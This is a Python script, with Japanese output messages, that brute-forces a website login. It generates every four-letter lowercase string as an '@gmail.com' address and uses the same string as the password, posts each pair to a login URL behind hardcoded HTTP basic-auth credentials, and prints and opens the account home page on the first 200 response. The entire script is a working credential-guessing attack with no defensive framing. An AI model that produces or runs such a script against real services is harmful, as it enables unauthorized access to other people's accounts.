import webbrowser
import string
import requests
from requests.auth import HTTPBasicAuth

url = "https://welp.melonkun.jp/login/"
url2 = "https://welp.melonkun.jp/home/"

auth = HTTPBasicAuth('melon', 'melon')

def test():
    words = list(string.ascii_lowercase)
    user_ids = []
    user_passwords = []
    for word_1 in words:
        for word_2 in words:
            for word_3 in words:
                for word_4 in words:
                    user_id = word_1 + word_2 + word_3 + word_4 + "@gmail.com"
                    user_password = word_1 + word_2 + word_3 + word_4
                    user_ids.append(user_id)
                    user_passwords.append(user_password)
    return user_ids, user_passwords

result_ids, result_passwords = test()

session = requests.Session()
for i in range(len(result_ids)):
    response = session.post(url, auth=auth, data={"username": result_ids[i], "password": result_passwords[i]})
    
    if response.status_code == 200:
        print("ログインに成功しました。")
        print("特定のメールアドレス: ", result_ids[i])
        print("特定のパスワード: ", result_passwords[i])
        break
    else:
        print("ログインに失敗しました。")

response2 = session.get(url2)
print(response2.text)

webbrowser.open(url2)
